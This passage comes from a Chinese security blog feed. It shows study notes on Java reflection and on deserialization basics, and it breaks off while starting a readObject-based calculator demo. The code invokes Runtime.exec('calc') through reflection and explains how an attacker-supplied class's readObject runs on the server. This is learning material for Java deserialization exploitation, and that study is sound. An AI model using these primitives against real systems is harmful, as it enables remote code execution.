alt="image-20240729174035334"></p><blockquote><p>其实讲到这里应该也能够理解上一节中所讲述的通过反射修改对象值的内容</p></blockquote><h1 id="三、利用反射弹计算器"><a href="#三、利用反射弹计算器" class="headerlink" title="三、利用反射弹计算器"></a>三、利用反射弹计算器</h1><p>在讲述这部分内容之前我们需要对<code>Runtime</code>类进行了解</p><p>在Java编程中，<code>Runtime</code> 类提供了一种与Java应用程序的运行环境进行交互的方式。<code>Runtime</code> 类是一个单例类，它封装了应用程序运行时的环境，通过它，开发者可以访问JVM的某些底层特性和功能。以下是 <code>Runtime</code> 类的主要作用和功能：</p><ol><li><p>执行系统命令</p><p>可以使用 <code>exec</code> 方法来执行操作系统命令，这在需要与系统进程交互时非常有用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    Runtime.getRuntime().exec(<span class="hljs-string">&quot;notepad&quot;</span>);<br>&#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>    e.printStackTrace();<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>内存管理</p></li><li><p>关闭JVM</p></li><li><p>添加JVM关闭钩子</p></li></ol><p>我们这里主要运用的是&#x3D;&#x3D;执行系统命令&#x3D;&#x3D;的功能，所以这里只对执行系统命令进行举例；</p><p>假设我们需要使用<code>Runtime</code>类进行弹计算器，那么我们正常通过代码编写应该是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们来到<code>java.lang.Runtime</code>中发现<code>Runtime()</code>构造方法是私有的，所以我们不能直接通过<code>newInstance</code>去实例化对象，所以引申出以下两种方法调用<code>exec</code>方法</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407301331153.png" alt="image-20240730133122979"></p><p>方法一：通过获取构造方法设置可访问属性<code>setAccessible(true)</code>，然后再实例化对象即可，具体实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.mango.reflection;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Project</span> unSerialize</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@File</span> com.mango.reflection.reflectionRuntime.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> mango</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2024/7/30 13:24</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">reflectionRuntime</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, IOException, InvocationTargetException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor();<br>        con.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> con.newInstance();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">mRuntime</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">mExec</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">re</span> <span class="hljs-operator">=</span> mRuntime.invoke(o);<br>        mExec.invoke(re, <span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>方法二：使用单例模式直接调用<code>getRuntime</code>和<code>exec</code>函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.mango.reflection;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Project</span> unSerialize</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@File</span> com.mango.reflection.reflectionRuntime.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> mango</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2024/7/30 13:24</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">reflectionRuntime</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, IOException, InvocationTargetException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">mRuntime</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">mExec</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">re</span> <span class="hljs-operator">=</span> mRuntime.invoke(c);<br>        mExec.invoke(re, <span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><p>以上两种方式都是可以成功弹出计算器的，本次的博客是对反射机制进行介绍和一些简单的实践，后续可以通过这些内容在反序列化中进行利用；反射只是一种方式，并不能够作为一种攻击手段；后续还需要学习更多关于反序列化的知识和内容；</p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
      <tag>反序列化</tag>
      
      <tag>Java反射</tag>
      
      <tag>利用链</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反序列化基础概念与URLDNS利用</title>
    <link href="/2024/07/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E4%B8%8EURLDNS%E5%88%A9%E7%94%A8/"/>
    <url>/2024/07/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E4%B8%8EURLDNS%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<blockquote><p>该博客为参考学习笔记博客，仅为本人记录的笔记，所以欢迎大家去<code>Drunkbaby</code>师傅的博客中进行学习！<a href="https://drun1baby.top/">Drunkbaby’s Blog</a></p></blockquote><p>参考链接：<a href="https://drun1baby.top/2022/05/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-01-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A6%82%E5%BF%B5%E4%B8%8E%E5%88%A9%E7%94%A8/">Java反序列化基础篇-01-反序列化概念与利用</a></p><h1 id="一、基础概念"><a href="#一、基础概念" class="headerlink" title="一、基础概念"></a>一、基础概念</h1><h2 id="1-1-概念"><a href="#1-1-概念" class="headerlink" title="1.1 概念"></a>1.1 概念</h2><p><strong>序列化（Serialization）</strong>是指将数据结构或对象转换为一种可以存储或传输的格式的过程。这种格式通常是字节流或字符串，以便可以通过网络传输、保存到文件中或存储在数据库中。常见的序列化格式包括JSON、XML、二进制格式等。</p><p><strong>反序列化（Deserialization）</strong>是指将序列化的数据格式转换回原始数据结构或对象的过程。通过反序列化，可以从存储或传输的格式中重新构建出原始的数据结构或对象。</p><blockquote><p>简单理解：</p><p>序列化：对象 -&gt; 字符串</p><p>反序列化：字符串 -&gt; 对象</p></blockquote><h2 id="1-2-目的"><a href="#1-2-目的" class="headerlink" title="1.2 目的"></a>1.2 目的</h2><p>为了方便数据的传输！</p><ol><li><strong>数据持久化</strong>：将数据保存到文件、数据库等存储介质中，以便在以后重新加载和使用。</li><li><strong>数据传输</strong>：在网络通信中，通过序列化将数据转换为可以传输的格式，并在接收端通过反序列化恢复为原始数据。</li><li><strong>跨平台数据交换</strong>：不同系统或编程语言之间的数据交换，通过标准的序列化格式（如JSON、XML等）实现互操作性。</li></ol><h2 id="1-3-应用场景"><a href="#1-3-应用场景" class="headerlink" title="1.3 应用场景"></a>1.3 应用场景</h2><ol><li>想把内存中的对象保存到一个文件中或者是数据库当中。</li><li>用套接字在网络上传输对象。</li><li>通过 RMI 传输对象的时候。</li></ol><h2 id="1-4-常见的序列化格式"><a href="#1-4-常见的序列化格式" class="headerlink" title="1.4 常见的序列化格式"></a>1.4 常见的序列化格式</h2><p><strong>JSON</strong>：一种轻量级的数据交换格式，易于人类阅读和编写，同时也便于机器解析和生成。</p><p><strong>XML</strong>（<strong>SOAP</strong>）：一种标记语言，广泛用于文档存储和数据传输。</p><p><strong>Protobuf</strong>：Google开发的高效二进制序列化格式，适用于高性能需求的应用场景。</p><p><strong>YAML</strong>：一种易读的序列化格式，常用于配置文件。</p><h1 id="二、java原生序列化"><a href="#二、java原生序列化" class="headerlink" title="二、java原生序列化"></a>二、java原生序列化</h1><ul><li>类文件：<strong>Person.java</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.mango.serialize;<br><br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Project</span> unSerialize</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@File</span> com.mango.serialize.person.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> mango</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2024/7/27 15:49</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>序列化文件 <strong>serializationTest.java</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.mango.serialize;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Project</span> unSerialize</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@File</span> com.mango.serialize.serializationTest.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> mango</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2024/7/27 15:51</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">serializationTest</span> &#123;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException&#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>, <span class="hljs-number">22</span>);<br>        System.out.println(person);<br>        serialize(person);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>反序列化文件 <strong>unserializeTest.java</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.mango.unserialize;<br><br><span class="hljs-keyword">import</span> com.mango.serialize.Person;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Project</span> unSerialize</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@File</span> com.mango.unserialize.unserializeTest.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> mango</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2024/7/27 15:55</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">unserializeTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> (Person) unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>        System.out.println(person);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>依次运行<strong>serializeTest.java</strong>和<strong>unserialize.java</strong>可以得到相应的结果；</p><p>运行<strong>serialize.java</strong>即可得到类Person序列化后的文件<strong>ser.bin</strong>，然后运行<strong>unserialize.java</strong>将序列化的<strong>ser.bin</strong>反序列化后进行输出；</p><h2 id="2-1-serialize-java文件解析"><a href="#2-1-serialize-java文件解析" class="headerlink" title="2.1 serialize.java文件解析"></a>2.1 serialize.java文件解析</h2><p>函数<strong>serialize</strong>封装了序列化功能，通过创建<code>FileOutputStream</code>输出流对象将序列化后的数据输出到文件<code>ser.bin</code>中，再通过<code>ObjectOutputStream</code>对象的<strong>writeObject</strong>方法将对象进行序列化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span>  <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException&#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<span class="hljs-comment">// 对象输出流数据输出到ser.bin文件中</span><br>        oos.writeObject(obj);<span class="hljs-comment">//obj对象序列化写入输出流</span><br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="2-2-unserialize-java文件解析"><a href="#2-2-unserialize-java文件解析" class="headerlink" title="2.2 unserialize.java文件解析"></a>2.2 unserialize.java文件解析</h2><p>刚好与序列化相反，直接读取序列化的数据<code>ser.bin</code>中的序列化数据，在调用<strong>ObjectInputStream</strong>对象的<strong>readObject</strong>方法进行反序列化读取到类对象；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<span class="hljs-comment">//读取指定文件作为对象输入流数据</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<span class="hljs-comment">// 反序列化读取对象</span><br>    <span class="hljs-keyword">return</span> obj;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-3-Serializable接口说明"><a href="#2-3-Serializable接口说明" class="headerlink" title="2.3 Serializable接口说明"></a>2.3 Serializable接口说明</h2><ol><li>序列化类的属性没有实现 Serializable 那么在序列化就会报错！</li></ol><p>只有实现 了<strong>Serializable</strong> 或者 <strong>Externalizable</strong> 接口的类的对象才能被序列化为字节序列。（不是则会抛出异常）</p><p>Serializable 接口是 Java 提供的序列化接口，它是一个空接口，所以其实我们不需要实现什么。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407271618261.png" alt="image-20240727161753172"></p><p>Serializable 用来标识当前类可以被 ObjectOutputStream 序列化，以及被 ObjectInputStream 反序列化。如果我们此处将 Serializable 接口删除掉的话，会导致如下结果。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407271618695.png" alt="image-20240727161840651"></p><ol start="2"><li>在反序列化过程中，它的父类如果没有实现序列化接口（implements Serializable），那么将需要提供无参构造函数来重新创建对象。</li><li>一个实现 Serializable 接口的子类也是可以被序列化的。</li><li>静态成员变量是不能被序列化</li><li>transient 标识的对象成员变量不参与序列化</li></ol><h1 id="三、序列化安全问题"><a href="#三、序列化安全问题" class="headerlink" title="三、序列化安全问题"></a>三、序列化安全问题</h1><h2 id="3-1-安全问题产生的原因"><a href="#3-1-安全问题产生的原因" class="headerlink" title="3.1 安全问题产生的原因"></a>3.1 安全问题产生的原因</h2><ul><li>序列化与反序列化当中有两个 <strong>“特别特别特别特别特别”</strong> 重要的方法 ———— <code>writeObject</code> 和 <code>readObject</code>。</li></ul><p>这两个方法可以经过开发者重写，一般序列化的重写都是由于下面这种场景诞生的。</p><blockquote><p>举个例子，MyList 这个类定义了一个 arr 数组属性，初始化的数组长度为 100。在实际序列化时如果让 arr 属性参与序列化的话，那么长度为 100 的数组都会被序列化下来，但是我在数组中可能只存放 30 个数组而已，这明显是不可理的，所以这里就要自定义序列化过程啦，具体的做法是重写以下两个 private 方法：</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> Object <span class="hljs-title function_">readObject</span><span class="hljs-params">()</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-keyword">return</span> readObject(Object.class);<br>    &#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">if</span> (enableOverride) &#123;<br>            writeObjectOverride(obj);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            writeObject0(obj, <span class="hljs-literal">false</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException ex) &#123;<br>            <span class="hljs-keyword">if</span> (depth == <span class="hljs-number">0</span>) &#123;<br>                writeFatalException(ex);<br>            &#125;<br>            <span class="hljs-keyword">throw</span> ex;<br>        &#125;<br>    &#125;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(java.io.ObjectOutputStream s)</span><span class="hljs-keyword">throws</span> java.io.IOException<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException<br></code></pre></td></tr></table></figure><p>只要服务端反序列化数据，客户端传递类的 <code>readObject</code> 中代码会自动执行，基于攻击者在服务器上运行代码的能力。</p><blockquote><p>解释一下传递类的<code>readObject</code>函数会自动执行的原因：</p><p>当 <code>ObjectInputStream</code> 反序列化一个对象时，它会检查该类是否定义了一个私有的 <code>readObject</code> 方法。如果存在这样的一个方法，它就会调用这个方法来反序列化对象，而不是使用默认的反序列化机制。这允许开发者在反序列化过程中插入自定义的逻辑。</p><p>所以从根本上来说，Java 反序列化的漏洞的与 <code>readObject</code> 有关。</p></blockquote><h2 id="3-2-可能存在安全漏洞的形式"><a href="#3-2-可能存在安全漏洞的形式" class="headerlink" title="3.2 可能存在安全漏洞的形式"></a>3.2 可能存在安全漏洞的形式</h2><ol><li>入口类的 <code>readObject</code> 直接调用危险方法</li></ol><ul><li>这种情况呢，在实际开发场景中并不是特别常见，我们还是跟着代码来走一遍，写一段弹计算器的代码，文件 ——— “<strong>Person.Java</strong>”（定义自定义的readObject函数）</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.mango.serialize;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Project</span> unSerialize</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@File</span> com.mango.serialize.person.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> mango</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2024/7/27 